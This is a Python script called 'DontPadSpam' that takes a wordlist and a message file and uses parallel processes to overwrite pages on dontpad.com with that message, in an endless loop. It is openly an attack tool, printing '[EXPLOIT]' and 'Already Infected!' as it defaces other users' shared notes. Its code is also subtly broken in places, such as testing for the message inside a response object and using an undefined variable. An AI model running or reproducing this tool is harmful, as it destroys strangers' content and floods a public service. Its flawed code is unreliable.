import multiprocess,requests,sys
from termcolor import colored
from pyfiglet import Figlet
custom_fig = Figlet(font='slant')
print(colored(custom_fig.renderText('DontPadSpam'), "magenta"))
print(colored("-> http://dontpad.com/dontpadspam ", "magenta"))
wordlist = []
url = "http://dontpad.com/"


try:
	wordlist_file = open(str(sys.argv[1]),"r",encoding="utf-8")
	message_file = sys.argv[2]
	z = open(message_file, "r")
	message = z.read()
	message = message.rstrip('\n')
	t = int(sys.argv[3])
except:
	print(colored("Usage: python3 " + sys.argv[0] + " <wordlist> <payload> <number of threads>", "cyan"))
	exit()


for word in wordlist_file:
	wordlist.append(word.strip("\n").strip())

print(colored("[INFO]    - Starting...", "yellow"))
print(colored("[INFO]    - Payload: " + sys.argv[2], "yellow"))

def spam(word):
 	
    global wordlist
    global message
    global wordlist_file
    word = str(word).strip("\n").strip()
    r = requests.get(f"{url}{word}.body.json?lastUpdate=0")
    if message in r:
        print(colored("[INFO]    - Already Infected!", "yellow"))
    else:
        data = {"text":message}
        p = requests.post(url+word, data=data)
        url_and_word = url+word
    wordlist.remove(word)
    print(colored("[EXPLOIT] -  URL: " + url_and_word, "red"))
    print(colored(f"[INFO] - Just {len(wordlist)} words missing", "yellow"))  
	
try:
    with multiprocess.Pool(t) as p:
        while True:
            try:
                p.map(spam,wordlist)
            except:
                print(colored("[INFO]    - ERROR", "yellow"))
        print("end")
except Exception as e:
    print(e)
